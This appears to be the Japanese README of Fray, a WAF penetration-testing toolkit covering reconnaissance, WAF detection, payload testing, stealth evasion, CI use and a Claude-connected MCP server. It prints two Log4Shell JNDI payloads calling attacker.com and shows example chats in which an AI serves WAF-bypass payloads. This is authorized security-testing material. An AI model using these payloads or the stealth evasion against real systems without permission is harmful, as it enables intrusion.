# Fray

### ⚔️ *オープンソースWAFセキュリティテストツールキット — 情報収集、検出、テスト、レポート*

[![Payloads](https://img.shields.io/badge/ペイロード-5500+-brightgreen.svg?style=for-the-badge)](https://github.com/dalisecurity/fray)
[![WAF Detection](https://img.shields.io/badge/WAF検出-25社+-blue.svg?style=for-the-badge&logo=cloudflare)](https://github.com/dalisecurity/fray)
[![Recon Checks](https://img.shields.io/badge/情報収集チェック-14項目-orange.svg?style=for-the-badge)](https://github.com/dalisecurity/fray)
[![OWASP](https://img.shields.io/badge/OWASP-100%25-success.svg?style=for-the-badge&logo=owasp)](https://github.com/dalisecurity/fray)

[![PyPI](https://img.shields.io/pypi/v/fray.svg)](https://pypi.org/project/fray/)
[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![GitHub stars](https://img.shields.io/github/stars/dalisecurity/fray?style=social)](https://github.com/dalisecurity/fray/stargazers)

**🌐 Language:** [English](README.md) | **日本語**

> ⚠️ **正規の許可を得たセキュリティテスト専用** — 自身が所有する、または書面で明示的に許可を得たシステムのみテストしてください。

---

## なぜ Fray？

多くのペイロード集は静的なテキストファイルに過ぎません。Frayなら**一気通貫のワークフロー**で完結します — 情報収集 → 検出 → テスト → レポート：

- 🔍 **情報収集** — 14項目のチェック：TLS、ヘッダー、Cookie、DNS、CORS、公開ファイル、サブドメイン
- 🎯 **スマートテスト** — WordPressを検出したら sqli + xss ペイロードを自動推奨。Y/Nで選択
- 🛡️ **WAF検出** — 25社のベンダーをフィンガープリント（Cloudflare、AWS、Akamai、Imperva等）
- 🐛 **HackerOne対応** — 構造化されたJSON出力がHackerOneの脆弱性分類にそのまま対応
- 🤖 **AI対応** — Claude Code・ChatGPT連携用MCPサーバー搭載
- 📊 **ワンコマンドレポート** — HTML・Markdownで脆弱性分析レポートを生成
- ⚡ **依存関係ゼロ** — Python標準ライブラリのみで動作。`pip install fray` ですぐ使える

| OWASPフレームワーク | ペイロード数 | カバレッジ |
|-------------------|-----------|----------|
| **Web Top 10:2021** | 1,690+ | ✅ 100% |
| **Mobile Top 10:2024** | 575+ | ✅ 100% |
| **LLM Top 10**（AI/ML） | 300+ | ✅ 100% |
| **API Security Top 10** | 520+ | ✅ 100% |

**対象ユーザー：** バグバウンティハンター · レッドチーム・ペンテスター · セキュリティ研究者 · WAF設定を検証するブルーチーム · セキュリティを学ぶ学生

---

## クイックスタート

```bash
pip install fray
```

```bash
# 1. 情報収集 — テスト前にターゲットを把握
fray recon https://example.com

# 2. スマートモード — 情報収集 + 対話的にペイロードを選択
fray test https://example.com --smart

# 3. WAFベンダーの検出
fray detect https://example.com

# 4. 特定カテゴリでテスト
fray test https://example.com -c xss --max 10

# 5. CVEを調べる — ペイロード、深刻度、テスト方法
fray explain CVE-2021-44228

# 6. レポート生成
fray report -i results.json -o report.html
```

---

## 🔍 情報収集 — `fray recon`

14項目の自動チェックをワンコマンドで実行：

```bash
fray recon https://example.com
```

| チェック項目 | 検出内容 |
|------------|---------|
| **TLS** | バージョン、暗号スイート、証明書の有効期限、TLS 1.0/1.1 |
| **セキュリティヘッダー** | HSTS、CSP、X-Frame-Options + 他6項目（スコア付き） |
| **Cookie** | HttpOnly、Secure、SameSiteフラグ（スコア付き） |
| **フィンガープリント** | WordPress、Drupal、PHP、Node.js、React、nginx、Apache、Java、.NET等 |
| **DNS** | A/AAAA/CNAME/MX/TXT/NSレコード、CDN検出、SPF/DMARC |
| **robots.txt** | 制限パス、注目すべきエンドポイント（admin、api、login） |
| **CORS** | ワイルドカードオリジン、反射型オリジン、認証情報の設定不備 |
| **公開ファイル** | 28パスをプローブ — `.env`、`.git`、phpinfo、actuator、SQLダンプ |
| **HTTPメソッド** | 危険なメソッド：PUT、DELETE、TRACE |
| **エラーページ** | スタックトレース、バージョンリーク、フレームワーク情報の404分析 |
| **サブドメイン** | crt.sh証明書透明性ログによる列挙 |

```bash
fray recon https://example.com --json       # JSON出力
fray recon https://example.com -o recon.json # ファイルに保存
```

> 📖 詳細は [docs/quickstart.md](docs/quickstart.md) を参照

---

## 🎯 スマートモード — `fray test --smart`

情報収集を先に実行し、検出結果に基づき最適なペイロードを提案：

```
🔍 Running reconnaissance on https://example.com...

───────────────────────────────────────────────────
  Target:  https://example.com
  TLS:     TLSv1.3
  Headers: 67%
  Stack:   wordpress (100%), nginx (70%)
───────────────────────────────────────────────────

  Recommended categories (based on detected stack):

    1. sqli                      (1200 payloads)
    2. xss                       (800 payloads)
    3. path_traversal            (400 payloads)

    Total: 2400 payloads (vs 5500 if all categories)

  [Y] Run recommended  [A] Run all  [N] Cancel  [1,3] Pick:
```

| 入力 | 動作 |
|-----|------|
| **Y** | 推奨カテゴリを実行 |
| **A** | 全カテゴリを実行 |
| **N** | キャンセル |
| **1,3** | 特定のカテゴリを選択 |

```bash
fray test https://example.com --smart -y    # 自動承認（CI/スクリプト用）
```

**検出技術 → ペイロードのマッピング：**

| 検出技術 | 優先ペイロード |
|---------|-------------|
| WordPress | sqli, xss, path_traversal, command_injection, ssrf |
| Drupal | sqli, ssti, xss, command_injection |
| PHP | sqli, path_traversal, command_injection, file_upload |
| Node.js | ssti, ssrf, xss, command_injection |
| Java | ssti, xxe, sqli, command_injection |
| .NET | sqli, path_traversal, xxe, command_injection |

> 📖 OWASPカバレッジの詳細は [docs/owasp-complete-coverage.md](docs/owasp-complete-coverage.md) を参照

---

## 🛡️ WAF検出 — 25社対応

```bash
fray detect https://example.com
```

対応ベンダー：**Cloudflare、AWS WAF、Akamai、Imperva、F5 BIG-IP、Fastly、Azure WAF、Google Cloud Armor、Sucuri、Fortinet、Wallarm、Vercel** 他13社

[全ベンダー一覧 + 検出シグネチャ →](docs/waf-detection-guide.md) · [WAFリサーチ →](docs/waf-detection-research.md)

---

## � 認証付きスキャン

本当の脆弱性はログイン後の画面に潜んでいます。Frayは全コマンドで認証付きスキャンに対応：

```bash
# Cookie認証
fray recon https://app.example.com --cookie "session=abc123; csrf=xyz"
fray test https://app.example.com -c xss --cookie "session=abc123"

# Bearerトークン（JWT、APIキー）
fray test https://api.example.com -c sqli --bearer "eyJhbGciOiJIUzI1NiJ9..."

# カスタムヘッダー（-Hで複数指定可）
fray recon https://app.example.com -H "X-API-Key: secret" -H "X-Tenant: acme"

# フォームログイン — 認証情報をPOST、セッションを自動取得してスキャン
fray test https://app.example.com -c xss \
  --login-flow "https://app.example.com/login,username=admin,password=secret"

# 組み合わせ：ログイン + スコープ + スマートモード
fray test https://app.example.com --smart --scope scope.txt \
  --login-flow "https://app.example.com/login,email=user@test.com,password=pass123"
```

| フラグ | 対応コマンド | 説明 |
|------|-----------|------|
| `--cookie` | recon, detect, test | セッションCookie文字列 |
| `--bearer` | recon, detect, test | Bearer/JWTトークン |
| `-H` / `--header` | recon, detect, test | 任意のカスタムヘッダー（複数指定可） |
| `--login-flow` | recon, detect, test | フォームログイン → セッションCookie自動取得 |

---

## 🥷 レート制限 & ステルスモード

実際のペンテストではレート制限で頻繁にブロックされます。Frayには回避機能を内蔵：

```bash
# ランダムなジッター（0〜2秒）を基本遅延に追加
fray test https://target.com -c xss --delay 1 --jitter 2

# リクエスト/秒を制限（例：最大2 req/s）
fray test https://target.com -c sqli --rate-limit 2

# ステルスモード — 1つのフラグで完全回避：
#   • User-Agentランダム化（Chrome/Firefox/Safari/Edge/モバイル）
#   • Accept-Languageランダム化
#   • 自動ジッター（1秒）+ スロットル（最大2 req/s）
fray test https://target.com --smart --stealth

# 全機能組み合わせ
fray test https://target.com --stealth --scope scope.txt \
  --cookie "session=abc" --delay 2 --jitter 3 --rate-limit 1
```

| フラグ | デフォルト | 説明 |
|------|---------|------|
| `--delay` | 0.5秒 | リクエスト間の固定遅延 |
| `--jitter` | 0 | 遅延に加算されるランダム変動（0〜N秒） |
| `--rate-limit` | 0（無制限） | 1秒あたりの最大リクエスト数 |
| `--stealth` | オフ | UA回転、ジッター（1秒）、スロットル（2 req/s）を有効化 |

`--stealth`はデフォルト値を設定しますが、`--delay 5 --jitter 3`などの手動指定を優先します。

---

## ⚡ GitHub Actions — CI/CD連携

PRごとにWAFテストを自動実行：

```yaml
# .github/workflows/waf-test.yml
name: WAF Security Test
on: [pull_request]
permissions:
  pull-requests: write

jobs:
  waf-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dalisecurity/fray@v1
        with:
          target: ${{ secrets.FRAY_TARGET_URL }}
          mode: smart
          fail-on-bypass: 'true'
```

### 全オプション

```yaml
- uses: dalisecurity/fray@v1
  with:
    target: 'https://staging.example.com'
    mode: smart              # smart | all | xss | sqli | ssrf ...
    max-payloads: '50'       # カテゴリ別最大ペイロード数
    stealth: 'true'          # UA回転 + ジッター + スロットル
    cookie: ${{ secrets.SESSION_COOKIE }}
    bearer: ${{ secrets.API_TOKEN }}
    scope-file: 'scope.txt'  # スコープ内のみテスト
    fail-on-bypass: 'true'   # WAFバイパス時にCI失敗
    comment-on-pr: 'true'    # PR結果テーブルをコメント
    webhook: ${{ secrets.SLACK_WEBHOOK }}
```

### 動作内容

1. **Frayインストール** — PyPIから自動取得
2. **WAF検出** — ベンダー特定（Cloudflare、AWS WAF等）
3. **ペイロードテスト** — スマートモードまたはカテゴリ指定
4. **結果アップロード** — ビルドアーティファクトとして保存
5. **PRコメント** — 結果テーブル（ブロック/バイパス/レート）を投稿
6. **CI失敗** — WAFバイパス検出時に自動失敗（オプション）

### CLIからワークフロー生成

```bash
fray ci init                                       # .github/workflows/ にYAMLを生成
fray ci init --target https://staging.example.com  # ターゲットURL指定
fray ci show --minimal                             # 最小ワークフローを表示
```

---

## 🐛 バグバウンティ連携

Frayはバグバウンティのワークフローに最適化されています — 情報収集からレポート提出まで：

```bash
# フルワークフロー：情報収集 → スマートテスト → レポート
fray recon https://target.hackerone.com -o recon.json
fray test https://target.hackerone.com --smart -y -o results.json
fray report -i results.json -o report.html --format markdown
```

| プラットフォーム | Frayの活用方法 |
|---------------|-------------|
| **HackerOne** | 構造化された発見事項、Markdownレポート、脆弱性分類の整合 |
| **Bugcrowd** | JSON出力が提出テンプレートに対応 |
| **Intigriti** | 情報収集 → テスト → レポートのワークフロー |
| **YesWeHack** | 情報収集スコアからの重大度マッピング |

### スコープファイル対応

バグバウンティハンターは常にスコープファイルを使います。Frayはそのまま読み込めます：

```bash
# scope.txt（Burp形式）
example.com
*.example.com
10.0.0.0/24
https://app.example.com/api
- staging.example.com    # 除外
! internal.example.com   # 除外
```

```bash
# スコープファイルを確認
fray scope scope.txt

# ターゲットがスコープ内かチェック
fray scope scope.txt --check https://sub.example.com

# スコープ強制付きテスト — 範囲外のターゲットをブロック
fray test https://target.com --smart --scope scope.txt
```

対応形式: **ドメイン、ワイルドカード（\*.example.com）、IP、CIDR、URL、スコープ外除外**

### ワークフロー例

```
1. fray scope scope.txt                           → スコープを確認
2. fray recon https://target.com                  → 攻撃対象面を調査
3. fray detect https://target.com                 → WAFの種類を特定
4. fray test https://target.com --smart --scope scope.txt  → スコープ強制付きテスト
5. fray report -i results.json                    → 提出用レポートを生成
```

---

## 🤖 MCPサーバー — AI連携

```bash
pip install fray[mcp]
fray mcp
```

Claude Desktop設定（`~/Library/Application Support/Claude/claude_desktop_config.json`）に追加：

```json
{
  "mcpServers": {
    "fray": { "command": "python", "args": ["-m", "fray.mcp_server"] }
  }
}
```

**6つのツール：** `list_payload_categories`、`get_payloads`、`search_payloads`、`get_waf_signatures`、`get_cve_details`、`suggest_payloads_for_waf`

Claudeに質問：*「CloudflareをバイパスするXSSペイロードは？」* → MCPツールが直接呼び出されます。

### 例：CVE検索

```
You:    「FrayはReact2Shellをカバーしてる？」
Claude:  → get_cve_details("react2shell") を呼び出し
         → 「はい — xss/cve_2025_real_world.json に5件のペイロード
            React Server Components RCE（CVSS 10.0、CISA KEV）を含む」

You:    「Log4Shellのペイロードを見せて」
Claude:  → search_payloads("log4shell") を呼び出し
         → JNDIインジェクションのバリエーション15件を返却

You:    「AWS WAFに効くペイロードは？」
Claude:  → suggest_payloads_for_waf("aws") を呼び出し
         → AWS WAF向けの優先バイパスペイロードを返却
```

[Claude Codeガイド →](docs/claude-code-guide.md) · [ChatGPTガイド →](docs/chatgpt-guide.md)

---

## 📊 レポート

```bash
fray report --sample                           # デモレポート
fray report -i results.json -o report.html     # HTMLレポート
fray report -i results.json --format markdown  # Markdownレポート
```

![Fray サンプルレポート](docs/sample-report.png)

[レポートガイド →](docs/report-guide.md) · [POCシミュレーションガイド →](docs/poc-simulation-guide.md)

---

## 📦 5,500以上のペイロード

```bash
fray payloads  # 全カテゴリを一覧表示
```

| カテゴリ | ペイロード数 | カテゴリ | ペイロード数 |
|---------|-----------|---------|-----------|
| XSS | 867 | SSRF | 167 |
| SQLi | 456 | SSTI | 98 |
| コマンドインジェクション | 234 | XXE | 123 |
| パストラバーサル | 189 | ファイルアップロード | 70+ |
| AI/LLMプロンプトインジェクション | 370 | Webシェル | 160+ |
| OWASPモバイル | 575+ | CVEエクスプロイト | 220 |

**120件の実際のCVE**（2020–2026年）を含む：Log4Shell、Spring4Shell、ProxyShell、React2Shell等。

### `fray explain` — CVEインテリジェンス

```bash
fray explain CVE-2021-44228        # CVE IDで検索
fray explain log4shell              # 名前で検索
fray explain react2shell --max 10   # 表示数を増やす
fray explain spring4shell --json    # JSON出力
```

```
Fray Explain — CVE Intelligence
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  CVE-2021-44228
  Log4Shell - Log4j RCE

  Severity:     CRITICAL（CVSS 10.0）
  Affected:     Log4j 2.0-beta9 〜 2.14.1
  Disclosed:    2021-12-09
  Payloads:     2件

  #1 ${jndi:ldap://attacker.com/exploit}
  #2 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}

  テスト方法:
    → コマンド実行エンドポイントを確認、入力サニタイズを検証
    → fray test <url> -c xss --max 10
```

[全ペイロードデータベース →](docs/payload-database-coverage.md) · [CVEカバレッジ →](docs/cve-real-world-bypasses.md) · [AIセキュリティ →](docs/ai-security-guide.md) · [モバイルセキュリティ →](docs/owasp-mobile-top10.md) · [APIセキュリティ →](docs/owasp-api-security.md)

---

## 🏗️ プロジェクト構成

```
fray/
├── fray/
│   ├── cli.py              # CLIエントリーポイント
│   ├── recon.py             # 14項目の情報収集エンジン
│   ├── detector.py          # WAF検出（25社対応）
│   ├── tester.py            # ペイロードテストエンジン
│   ├── evolve.py            # 適応型ペイロード進化
│   ├── reporter.py          # HTML + Markdownレポート
│   ├── mcp_server.py        # AI連携用MCPサーバー
│   └── payloads/            # 5,500以上のペイロード（22カテゴリ）
├── tests/                   # 330テスト
├── docs/                    # 28ガイド
└── pyproject.toml           # pip install fray
```

---

## 📈 ロードマップ

**完了：**
- [x] 14項目の情報収集機能（`fray recon`）
- [x] 対話型プロンプトによるスマートペイロード選択（`--smart`）
- [x] Cookie、CORS、公開ファイル、DNS、サブドメインスキャン
- [x] 適応型ペイロード進化
- [x] HTML + Markdownレポート生成
- [x] AI連携用MCPサーバー

**次のステップ：**
- [ ] 共有可能なレポートURL（一時ホスティングHTML）
- [ ] HackerOne API連携（自動送信）
- [ ] Webベースのレポートダッシュボード
- [ ] MLベースのペイロード有効性スコアリング
- [ ] マルチWAF比較テスト

---

## コントリビュート

[CONTRIBUTING.md](CONTRIBUTING.md) を参照。ペイロードの追加、ツール改善、ドキュメントのPRを歓迎します。

## 法的事項

**MITライセンス** — [LICENSE](LICENSE) を参照。所有または明示的な許可を得たシステムのみテストしてください。本ツールの悪用について著者は一切の責任を負いません。

**セキュリティ問題：** soc@dalisec.io · [SECURITY.md](SECURITY.md)

---

**[📖 全ドキュメント（28ガイド）](docs/) · [PyPI](https://pypi.org/project/fray/) · [Issues](https://github.com/dalisecurity/fray/issues) · [Discussions](https://github.com/dalisecurity/fray/discussions)**
